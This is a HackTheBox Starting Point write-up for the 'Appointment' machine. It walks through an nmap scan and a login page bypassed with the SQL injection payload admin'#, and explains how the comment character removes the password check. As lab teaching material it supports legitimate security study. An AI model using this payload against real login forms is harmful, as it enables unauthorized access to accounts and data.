# Appointment — HackTheBox Starting Point — Easy

> **Date:** 2026-05-25  
> **Platform:** HackTheBox — Starting Point Tier 1  
> **Difficulty:** Easy  
> **Tags:** `#linux` `#sqli` `#web` `#authentication-bypass`

---

## Summary

Linux machine running an Apache web server with a login page vulnerable to SQL injection. Authentication bypassed using a classic `admin'#` payload that comments out the password check in the SQL query.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN nmap_appointment.txt 10.129.17.213
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 80   | HTTP    | Apache httpd 2.4.38 (Debian) |

**Notes:** Only one port open — the attack surface is entirely the web application.

---

## Enumeration

Opened the web application in the browser:

```
http://10.129.17.213
```

Found a **login page** with username and password fields.

No Gobuster needed — the login form is the direct attack vector.

---

## Exploitation

### SQL Injection — Authentication Bypass

The login form passes user input directly into a SQL query without sanitization.

The backend query likely looks like this:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';
```

By injecting `admin'#` as the username, the `#` character comments out the rest of the query, bypassing the password check entirely:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything';
```

**Payload used:**

| Field | Value |
|-------|-------|
| Username | `admin'#` |
| Password | `anything` |

**Result:** Successfully logged in as admin ✅

---

## Flags

| Flag | Value |
|------|-------|
| Root | `HTB{REDACTED}` |

---

## Lessons Learned

- Always test login forms with basic SQL injection payloads
- The `#` character in MySQL comments out everything after it — powerful for auth bypass
- A single open port (80) means the web app is the only attack surface — focus there
- OWASP A03:2021 Injection is still one of the most common vulnerabilities in the wild

---

## References

- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadsAllTheThings - SQLi Auth Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
